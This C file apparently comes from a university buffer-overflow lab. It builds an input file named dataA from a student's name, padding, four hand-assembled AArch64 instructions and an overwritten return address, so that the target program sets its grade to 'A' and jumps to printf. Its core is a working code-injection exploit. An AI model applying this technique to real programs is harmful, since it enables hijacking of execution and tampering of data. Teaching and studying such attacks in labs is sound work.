/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Tharun Kumar Tiruppali Kalidoss, Sarika Ahire              */
/*--------------------------------------------------------------------*/

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "miniassembler.h"

int main(void) {
    FILE* psFile;
    unsigned long ret;
    unsigned int mov;
    unsigned int adr;
    unsigned int strb;
    unsigned int b;
    int i;
    char* name;
    
    name = "Sarika Ahire";

    /* return address */
    ret = 0x420068;

    /* 65 = A */
    mov = MiniAssembler_mov(0, 'A');

    /* 0x420044 = address of grade in data
       0x42006C = address of instruction in bss = (start of name[]) + 20 */
    adr = MiniAssembler_adr(1, 0x420044, 0x42006C);

    strb = MiniAssembler_strb(0, 1);

    /* 0x400864 = address of printf(grade) 
       0x420074 = address of instruction in bss = (start of name[]) + 28 */
    b = MiniAssembler_b(0x400864, 0x420074);

    psFile = fopen("dataA", "w");
    
    /* name from 0-11 */
    fprintf(psFile, "%s", name);

    /* padding from 12-15 */
    for (i = 0; i < 4; i++)
        fprintf(psFile, "%c", '\0');

    /* mov w0, A from 16-19 */
    fwrite(&mov, sizeof(unsigned int), 1, psFile);
    /* adr x1, grade from 20-23 */
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
    /* strb w0, [x1] from 24-27 */
    fwrite(&strb, sizeof(unsigned int), 1, psFile);
    /* b printf from 28-31 */
    fwrite(&b, sizeof(unsigned int), 1, psFile);

    /* padding from 32-47 */
    for (i = 0; i < 16; i++)
        fprintf(psFile, "%c", '\0');
    
    fwrite(&ret, sizeof(unsigned long), 1, psFile);
    return 0;
}